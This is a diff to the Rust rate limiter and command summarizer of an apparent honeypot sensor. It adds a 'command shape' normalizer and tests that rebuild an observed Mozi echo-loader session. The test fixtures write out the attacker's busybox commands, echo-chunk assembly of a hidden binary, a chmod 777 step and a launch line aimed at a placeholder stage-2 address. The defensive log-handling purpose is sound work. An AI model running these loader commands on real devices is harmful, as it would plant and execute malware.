@@ -16,10 +16,13 @@
 //!
 //! Some events are never summarized. Everything that is not a plain command event
 //! ([`summarizable`]): logins, connections, downloads and derived URLs, capture uploads, the
-//! per-session flood markers, and summaries themselves. The first time each distinct command is
-//! seen from a source network in a window: a new command always appears in full, whatever the
-//! budget says. And each address's first command event in a window, because scoring is per
-//! address: a host whose commands all repeat a neighbour's would otherwise have none.
+//! per-session flood markers, and summaries themselves. The first time each distinct command
+//! shape ([`command_shape`]: the line with escapes, hex and base64 runs taken out) is seen from a
+//! source network in a window: a new kind of command always appears in full, whatever the budget
+//! says. And each address's first command event in a window, because scoring is per address: a
+//! host whose commands all repeat a neighbour's would otherwise have none. An echo-loader chunk
+//! (a command event carrying `assembled_file`) is never either kind of first: its bytes are in
+//! the capture, and the summary keeps the file and its highest chunk number.
 //!
 //! Memory is fixed. The bucket table is the limiter's (bounded with eviction); the window table
 //! holds at most [`DEFAULT_SUMMARY_CAPACITY`] networks, each tracking at most
@@ -54,8 +57,8 @@ use crate::rate_limit::{
 };
 use crate::sanitize_value;
 
-/// Command events a source network may write per second once its burst is spent.
-pub const DEFAULT_COMMAND_EVENT_RATE: u32 = 2;
+/// Command events a source network may write per minute once its burst is spent.
+pub const DEFAULT_COMMAND_EVENTS_PER_MIN: u32 = 12;
 /// Command events a source network may write at once. Several whole loader sessions fit, so an
 /// ordinary interactive attacker is never summarized.
 pub const DEFAULT_COMMAND_EVENT_BURST: u32 = 200;
@@ -89,8 +92,8 @@ pub struct CommandEventConfig {
 impl Default for CommandEventConfig {
     fn default() -> Self {
         Self {
-            rate: Rate::new(
-                NonZeroU32::new(DEFAULT_COMMAND_EVENT_RATE).unwrap_or(NonZeroU32::MIN),
+            rate: Rate::per_minute(
+                NonZeroU32::new(DEFAULT_COMMAND_EVENTS_PER_MIN).unwrap_or(NonZeroU32::MIN),
                 NonZeroU32::new(DEFAULT_COMMAND_EVENT_BURST).unwrap_or(NonZeroU32::MIN),
             ),
             window: COMMAND_SUMMARY_WINDOW,
@@ -129,10 +132,10 @@ impl From<EnvError> for CommandEventConfigError {
     }
 }
 
-/// The two variables `PROPOLIS_<SENSOR>_COMMAND_EVENT_RATE` and `..._BURST`.
+/// The two variables `PROPOLIS_<SENSOR>_COMMAND_EVENT_RATE_PER_MIN` and `..._BURST`.
 pub fn command_event_vars(sensor: &str) -> (String, String) {
     let prefix = format!("PROPOLIS_{}_COMMAND_EVENT", sensor.to_ascii_uppercase());
-    (format!("{prefix}_RATE"), format!("{prefix}_BURST"))
+    (format!("{prefix}_RATE_PER_MIN"), format!("{prefix}_BURST"))
 }
 
 impl CommandEventConfig {
@@ -161,12 +164,93 @@ impl CommandEventConfig {
                 })
         };
         Ok(Self {
-            rate: Rate::new(
-                read(&rate_var, DEFAULT_COMMAND_EVENT_RATE)?,
+            rate: Rate::per_minute(
+                read(&rate_var, DEFAULT_COMMAND_EVENTS_PER_MIN)?,
                 read(&burst_var, DEFAULT_COMMAND_EVENT_BURST)?,
             ),
             ..Self::default()
         })
+    }
+}
+
+/// What makes two commands the same for a first sighting: the line with its payload taken out.
+/// A loader's echo chunks differ only in their `\xNN` bytes and its markers only in their
+/// escapes or random hex, so each kind is one shape. Runs of `\xNN` or `\NNN` escapes, runs of
+/// 16 or more hex digits and base64-looking runs of 24 or more characters become placeholders,
+/// and whitespace runs collapse to one space.
+pub fn command_shape(command: &str) -> String {
+    let chars: Vec<char> = command.chars().collect();
+    let mut out = String::with_capacity(command.len().min(MAX_COMMAND_SAMPLE_LEN));
+    let mut i = 0;
+    while let Some(&c) = chars.get(i) {
+        let escapes = escape_run_len(chars.get(i..).unwrap_or_default());
+        if escapes > 0 {
+            out.push_str("<esc>");
+            i += escapes;
+        } else if c.is_whitespace() {
+            while chars.get(i).is_some_and(|c| c.is_whitespace()) {
+                i += 1;
+            }
+            if !out.is_empty() && i < chars.len() {
+                out.push(' ');
+            }
+        } else if is_base64_char(c) {
+            let start = i;
+            while chars.get(i).is_some_and(|&c| is_base64_char(c)) {
+                i += 1;
+            }
+            let run = chars.get(start..i).unwrap_or_default();
+            if run.len() >= 16 && run.iter().all(char::is_ascii_hexdigit) {
+                out.push_str("<hex>");
+            } else if run.len() >= 24 && looks_base64(run) {
+                out.push_str("<b64>");
+            } else {
+                out.extend(run);
+            }
+        } else {
+            out.push(c);
+            i += 1;
+        }
+    }
+    out
+}
+
+fn is_base64_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=')
+}
+
+/// At least two of upper case, lower case and digits: an encoded blob, not a long path or word.
+fn looks_base64(run: &[char]) -> bool {
+    let upper = run.iter().any(char::is_ascii_uppercase);
+    let lower = run.iter().any(char::is_ascii_lowercase);
+    let digit = run.iter().any(char::is_ascii_digit);
+    usize::from(upper) + usize::from(lower) + usize::from(digit) >= 2
+}
+
+/// The length of the run of `\xN`/`\xNN` and `\N`/`\NN`/`\NNN` (octal) escapes `chars` starts
+/// with; zero when it starts with none.
+fn escape_run_len(chars: &[char]) -> usize {
+    let mut at = 0;
+    loop {
+        let rest = chars.get(at..).unwrap_or_default();
+        let unit = match rest {
+            ['\\', 'x', h, ..] if h.is_ascii_hexdigit() => {
+                2 + 1 + usize::from(rest.get(3).is_some_and(char::is_ascii_hexdigit))
+            }
+            ['\\', d, ..] if d.is_digit(8) => {
+                1 + rest
+                    .iter()
+                    .skip(1)
+                    .take(3)
+                    .take_while(|c| c.is_digit(8))
+                    .count()
+            }
+            _ => 0,
+        };
+        if unit == 0 {
+            return at;
+        }
+        at += unit;
     }
 }
 
@@ -304,6 +388,13 @@ impl Window {
         s.last_seen = now;
         // A sample is taken only when a command is new to the summary, so a flood of one repeated
         // command allocates nothing per event.
+        // A loader chunk was never offered as a first sighting, so its shape may be new here.
+        if let Some(seen) = self.seen.as_mut()
+            && !seen.contains_key(&digest)
+            && seen.len() < MAX_TRACKED_COMMANDS
+        {
+            seen.insert(digest, 0);
+        }
         let new_command = match self.seen.as_mut().and_then(|seen| seen.get_mut(&digest)) {
             Some(suppressed) => {
                 *suppressed = suppressed.saturating_add(1);
@@ -425,7 +516,10 @@ impl CommandEventGate {
             .get("command")
             .and_then(Value::as_str)
             .unwrap_or_default();
-        let digest = self.hasher.hash_one(command);
+        let digest = self.hasher.hash_one(command_shape(command));
+        // An echo-loader chunk is never a first: its bytes are in the capture, and the summary
+        // keeps the file and the highest chunk number.
+        let loader_chunk = event.metadata.get("assembled_file").is_some();
         let key = SourceKey::of_ip(event.source_ip);
         let mut guard = self.state.lock().unwrap_or_else(|e| e.into_inner());
         let state = &mut *guard;
@@ -446,10 +540,14 @@ impl CommandEventGate {
                 .windows
                 .entry(key)
                 .or_insert_with(|| Window::new(now, true));
-            // Both are recorded whatever the other says.
-            let new_command = window.first_sighting(digest);
-            let new_address = window.first_from_address(event.source_ip);
-            new_command || new_address
+            if loader_chunk {
+                false
+            } else {
+                // Both are recorded whatever the other says.
+                let new_command = window.first_sighting(digest);
+                let new_address = window.first_from_address(event.source_ip);
+                new_command || new_address
+            }
         };
         let token = self.limiter.check_at(key, now) == RateDecision::Allow;
         if first || token {
@@ -606,8 +704,8 @@ pub fn command_summary_event(
     let mut metadata = json!({
         "protocol_label": s.sensor,
         "command": format!(
-            "<{} repeated commands from {source_prefix} summarized; each distinct command's first \
-             sighting is logged in full>",
+            "<{} repeated commands from {source_prefix} summarized; the first of each command \
+             shape is logged in full>",
             s.count
         ),
         COMMAND_SUMMARY_KEY: true,
@@ -862,27 +960,28 @@ mod tests {
             e.metadata["chunk_index"] = json!(index);
             e
         };
-        // Each chunk's first sighting is logged; every repeat folds.
+        // Each command's first sighting is logged and every repeat folds; every chunk folds.
         for (n, s) in sessions.iter().enumerate() {
-            for index in [3u64, 9, 5] {
-                let e = chunk(*s, index);
-                let first = n == 0;
-                assert_eq!(logged(&g, &e, t0 + Duration::from_millis(n as u64)), first);
+            let at = t0 + Duration::from_millis(n as u64);
+            for line in ["uname -a", "id -u", "cat /proc/cpuinfo"] {
+                assert_eq!(logged(&g, &command(src, line, *s), at), n == 0, "{line}");
             }
+            let index = [7u64, 40, 12][n % 3];
+            assert!(!logged(&g, &chunk(*s, index), at));
         }
         let s = g.take_due(t0 + COMMAND_SUMMARY_WINDOW);
         assert_eq!(s.len(), 1);
         let s = &s[0];
         assert_eq!(s.key, Some(SourceKey::V4([198, 51, 100])));
-        assert_eq!(s.count, 39 * 3);
-        assert_eq!(s.distinct_commands, 3);
+        assert_eq!(s.count, 39 * 3 + 40);
+        assert_eq!(s.distinct_commands, 4, "three commands and one chunk shape");
         assert!(!s.distinct_commands_capped);
-        assert_eq!(s.samples.len(), 3);
+        assert_eq!(s.samples.len(), 4);
         assert_eq!(s.sessions, MAX_SUMMARY_SESSIONS);
-        assert!(s.sessions_capped, "39 sessions counted to the cap");
-        assert_eq!(s.max_chunk_index, Some(9));
+        assert!(s.sessions_capped, "40 sessions counted to the cap");
+        assert_eq!(s.max_chunk_index, Some(40));
         assert_eq!(s.assembled_file.as_deref(), Some("/tmp/.i"));
-        assert_eq!(s.first_seen, t0 + Duration::from_millis(1));
+        assert_eq!(s.first_seen, t0);
         assert_eq!(s.last_seen, t0 + Duration::from_millis(39));
         assert_eq!(g.open_windows(), 0);
     }
@@ -1008,32 +1107,214 @@ mod tests {
         assert!(s.distinct_commands_capped);
     }
 
-    /// The observed loop: a fifty-three-command session, several running at once and repeated for
-    /// ten minutes from one address, every chunk a distinct command.
+    /// `\xNN` escapes of `bytes`, as the loader types them.
+    fn escaped(bytes: &[u8]) -> String {
+        bytes.iter().map(|b| format!("\\x{b:02x}")).collect()
+    }
+
+    /// The observed Mozi echo-loader session, 53 lines, with its stage-2 address replaced by an
+    /// RFC 5737 one. `marker` is the session's echo marker (fixed in the sample, random in other
+    /// loaders of the family). Each line comes with the chunk number it writes, if any.
+    fn observed_session(marker: &[u8]) -> Vec<(String, Option<u64>)> {
+        let marker = escaped(marker);
+        let mut lines: Vec<(String, Option<u64>)> = [
+            "start",
+            "enable",
+            "config terminal",
+            "system",
+            "linuxshell",
+            "su",
+            "shell",
+            "sh",
+        ]
+        .iter()
+        .map(|s| (s.to_string(), None))
+        .collect();
+        let mut push = |line: String, chunk: Option<u64>| lines.push((line, chunk));
+        push(
+            format!(
+                ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
+                 >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
+                 /bin/busybox echo -e '{marker}'"
+            ),
+            None,
+        );
+        push(
+            format!("/bin/busybox wget;/bin/busybox echo -ne '{marker}'"),
+            None,
+        );
+        push("/bin/busybox cat /bin/ls|head -n 1".to_string(), None);
+        push(
+            "/bin/busybox hexdump -e '16/1 \"%c\"' -n 52 /bin/ls".to_string(),
+            None,
+        );
+        for chunk in 1..=40u64 {
+            let body: Vec<u8> = (0..50u8)
+                .map(|b| b.wrapping_mul(31).wrapping_add(chunk as u8))
+                .collect();
+            let body = escaped(&body);
+            let line = match chunk {
+                1 => format!(
+                    "/bin/busybox echo -ne '{body}' > .i; >.x && /bin/busybox echo -en '{marker}'"
+                ),
+                40 => format!(
+                    "/bin/busybox echo -ne '{body}' >> .i; /bin/busybox chmod 777 .i || \
+                     (cp /bin/ls .j && cat .i>.j &&rm .i && cp .j .i &&rm .j) && \
+                     /bin/busybox echo -en '{marker}'"
+                ),
+                _ => format!(
+                    "/bin/busybox echo -ne '{body}' >> .i; >.x && /bin/busybox echo -en '{marker}'"
+                ),
+            };
+            push(line, Some(chunk));
+        }
+        push(
+            "./.i 198 51 100 23 3912;./Runn;/bin/busybox echo -e \
+             '\\x4d\\x4f\\x57\\x48\\x4c\\x42\\x58\\x54'"
+                .to_string(),
+            None,
+        );
+        assert_eq!(lines.len(), 53);
+        lines
+    }
+
+    fn loader_event(line: &str, chunk: Option<u64>, session: Uuid) -> SensorEvent {
+        let mut e = command("198.51.100.7", line, session);
+        if let Some(index) = chunk {
+            e.metadata["assembled_file"] = json!("/var/.i");
+            e.metadata["chunk_index"] = json!(index);
+        }
+        e
+    }
+
     #[test]
-    fn the_observed_loader_loop_is_bounded_by_burst_rate_and_first_sightings() {
-        let config = CommandEventConfig::default();
-        let g = CommandEventGate::new(config);
-        let t0 = Instant::now();
-        let session: Vec<String> = (0..53)
-            .map(|i| format!("busybox echo -ne '{i}' >> .i"))
+    fn the_shape_takes_out_escapes_hex_and_base64_and_collapses_whitespace() {
+        assert_eq!(
+            command_shape("busybox echo -ne '\\x7f\\x45\\x4c\\x46\\x02' >> .i"),
+            "busybox echo -ne '<esc>' >> .i"
+        );
+        assert_eq!(
+            command_shape("printf '\\177\\105\\114F' > a"),
+            "printf '<esc>F' > a"
+        );
+        assert_eq!(command_shape("echo -e '\\x4\\x41'"), "echo -e '<esc>'");
+        assert_eq!(
+            command_shape("echo 9f86d081884c7d659a2feaa0c55ad015 > /tmp/id"),
+            "echo <hex> > /tmp/id"
+        );
+        assert_eq!(
+            command_shape("echo dGhpcyBpcyBhIHRlc3Qgb2YgYmFzZTY0IQ== | base64 -d"),
+            "echo <b64> | base64 -d"
+        );
+        assert_eq!(command_shape("  uname   -a\t\n"), "uname -a");
+        // Short hex, words, paths and plain escapes stay: they are what tells commands apart.
+        for kept in [
+            "echo deadbeef",
+            "cat /usr/share/doc/something/changelog",
+            "/bin/busybox ECCHI",
+            "echo -e 'a\\nb'",
+            "cd /tmp; ls -la",
+        ] {
+            assert_eq!(command_shape(kept), kept);
+        }
+    }
+
+    #[test]
+    fn the_observed_session_is_sixteen_shapes_whatever_its_marker() {
+        use std::collections::BTreeSet;
+        let shapes = |marker: &[u8]| -> BTreeSet<String> {
+            observed_session(marker)
+                .iter()
+                .map(|(line, _)| command_shape(line))
+                .collect()
+        };
+        let observed = shapes(b"BKTKER");
+        let random = shapes(&[0x9c, 0x13, 0x55, 0xe0, 0x7a, 0x21]);
+        assert_eq!(observed, random, "a per-session marker is the same shape");
+        // Eight one-word preamble commands, four probes, three chunk forms and the run.
+        assert_eq!(observed.len(), 16, "{observed:#?}");
+        let chunk_shapes: BTreeSet<String> = observed_session(b"BKTKER")
+            .iter()
+            .filter(|(_, chunk)| chunk.is_some())
+            .map(|(line, _)| command_shape(line))
             .collect();
+        assert_eq!(
+            chunk_shapes.len(),
+            3,
+            "40 chunks, first, middle and last form"
+        );
+    }
+
+    #[test]
+    fn a_loader_chunk_is_never_a_first_sighting_and_still_feeds_the_summary() {
+        let g = gate(1, 1);
+        let s = Uuid::now_v7();
+        let t0 = Instant::now();
+        assert!(
+            logged(&g, &command("198.51.100.7", "id", s), t0),
+            "the token"
+        );
+        let chunk = |index: u64| {
+            loader_event(
+                &format!("/bin/busybox echo -ne '\\x{index:02x}' >> .i"),
+                Some(index),
+                s,
+            )
+        };
+        assert!(!logged(&g, &chunk(2), t0), "a new shape, but a chunk");
+        assert!(!logged(&g, &chunk(7), t0));
+        // From a new address too: a chunk is not that address's first.
+        let mut neighbour = chunk(3);
+        neighbour.source_ip = "198.51.100.8".parse().unwrap();
+        assert!(!logged(&g, &neighbour, t0));
+        // The summarized chunks made their shape seen: the same form untagged is no first either.
+        assert!(!logged(
+            &g,
+            &command("198.51.100.7", "/bin/busybox echo -ne '\\x09' >> .i", s),
+            t0
+        ));
+        // A new shape untagged is.
+        assert!(logged(&g, &command("198.51.100.7", "uname -a", s), t0));
+        let s = &g.drain()[0];
+        assert_eq!(s.count, 4);
+        assert_eq!(s.max_chunk_index, Some(7));
+        assert_eq!(s.assembled_file.as_deref(), Some("/var/.i"));
+        assert_eq!(s.distinct_commands, 1, "one shape");
+        assert!(!s.distinct_commands_capped);
+    }
+
+    /// The observed loop: the 53-line session, four at once from one address, a new round every
+    /// 30 s for ten minutes, each session with its own random marker.
+    #[test]
+    fn the_observed_loader_loop_is_bounded_by_burst_rate_shapes_and_addresses() {
+        let g = CommandEventGate::new(CommandEventConfig::default());
+        let t0 = Instant::now();
         let (mut logged_count, mut total) = (0u64, 0u64);
         let minutes = 10u64;
-        // Four sessions in parallel every 20 s: about 10.6 commands a second.
         let mut at = Duration::ZERO;
+        let mut round = 0u8;
         while at < Duration::from_secs(60 * minutes) {
-            for _ in 0..4 {
+            for parallel in 0..4u8 {
                 let id = Uuid::now_v7();
-                for (i, line) in session.iter().enumerate() {
-                    let now = t0 + at + Duration::from_millis(i as u64 * 300);
-                    let mut events = vec![command("198.51.100.7", line, id)];
+                let marker = [
+                    round,
+                    parallel,
+                    0x5a,
+                    round ^ 0xa5,
+                    parallel.wrapping_mul(17),
+                    0x42,
+                ];
+                for (i, (line, chunk)) in observed_session(&marker).iter().enumerate() {
+                    // About 29 s per session, as observed.
+                    let now = t0 + at + Duration::from_millis(i as u64 * 550);
+                    let mut events = vec![loader_event(line, *chunk, id)];
                     g.filter_at(&mut events, now);
                     total += 1;
                     logged_count += events.len() as u64;
                 }
             }
-            at += Duration::from_secs(20);
+            at += Duration::from_secs(30);
+            round = round.wrapping_add(1);
         }
         let mut summaries = g.take_due(t0 + Duration::from_secs(60 * minutes + 60));
         summaries.extend(g.drain());
@@ -1043,24 +1324,29 @@ mod tests {
             total,
             "every command counted once"
         );
-        let elapsed = 60 * minutes + 16;
         let windows = minutes + 1;
+        let (shapes, addresses) = (16u64, 1u64);
         let bound = u64::from(DEFAULT_COMMAND_EVENT_BURST)
-            + u64::from(DEFAULT_COMMAND_EVENT_RATE) * elapsed
-            + 53 * windows;
+            + u64::from(DEFAULT_COMMAND_EVENTS_PER_MIN) * (minutes + 1)
+            + shapes * windows
+            + addresses * windows;
+        eprintln!(
+            "observed loop, {minutes} min: {total} command events ungated, {logged_count} \
+             individual with the gate, {} summaries, bound {bound}",
+            summaries.len()
+        );
+        assert_eq!(total, 20 * 4 * 53);
         assert!(
             logged_count <= bound,
             "{logged_count} individual events past the bound {bound}"
-        );
-        assert!(
-            total > 6_000 && logged_count < total / 2,
-            "{logged_count}/{total}"
         );
         assert!(
             summaries.len() as u64 <= windows,
             "{} summaries",
             summaries.len()
         );
+        assert!(summaries.iter().all(|s| s.max_chunk_index.is_some()));
+        assert!(summaries.iter().any(|s| s.max_chunk_index == Some(40)));
     }
 
     #[test]
@@ -1076,26 +1362,32 @@ mod tests {
         assert_eq!(
             command_event_vars("telnet"),
             (
-                "PROPOLIS_TELNET_COMMAND_EVENT_RATE".to_string(),
+                "PROPOLIS_TELNET_COMMAND_EVENT_RATE_PER_MIN".to_string(),
                 "PROPOLIS_TELNET_COMMAND_EVENT_BURST".to_string()
             )
         );
         let default = CommandEventConfig::from_lookup("ssh", lookup(&[])).unwrap();
         assert_eq!(default, CommandEventConfig::default());
-        assert_eq!(default.rate.per_second(), 2);
+        assert_eq!(default.rate.count(), 12);
+        assert_eq!(default.rate.period(), Duration::from_secs(60));
         assert_eq!(default.rate.burst(), 200);
         let set = CommandEventConfig::from_lookup(
             "adb",
             lookup(&[
-                ("PROPOLIS_ADB_COMMAND_EVENT_RATE", "5"),
+                ("PROPOLIS_ADB_COMMAND_EVENT_RATE_PER_MIN", "5"),
                 ("PROPOLIS_ADB_COMMAND_EVENT_BURST", "50"),
+                // The per-second spelling never shipped and is not read.
+                ("PROPOLIS_ADB_COMMAND_EVENT_RATE", "0"),
             ]),
         )
         .unwrap();
-        assert_eq!((set.rate.per_second(), set.rate.burst()), (5, 50));
+        assert_eq!(
+            (set.rate.count(), set.rate.period(), set.rate.burst()),
+            (5, Duration::from_secs(60), 50)
+        );
         for bad in ["0", "-1", "two", "4294967296", "1.5"] {
             for var in [
-                "PROPOLIS_TELNET_COMMAND_EVENT_RATE",
+                "PROPOLIS_TELNET_COMMAND_EVENT_RATE_PER_MIN",
                 "PROPOLIS_TELNET_COMMAND_EVENT_BURST",
             ] {
                 let pairs: &'static [(&'static str, &'static str)] =
@@ -1177,8 +1469,8 @@ mod tests {
         assert_eq!(md["command_summary"], true);
         assert_eq!(
             md["command"],
-            "<1834 repeated commands from 198.51.100.0/24 summarized; each distinct command's \
-             first sighting is logged in full>"
+            "<1834 repeated commands from 198.51.100.0/24 summarized; the first of each command \
+             shape is logged in full>"
         );
         assert_eq!(md["suppressed_count"], 1834);
         assert_eq!(md["distinct_commands"], 53);
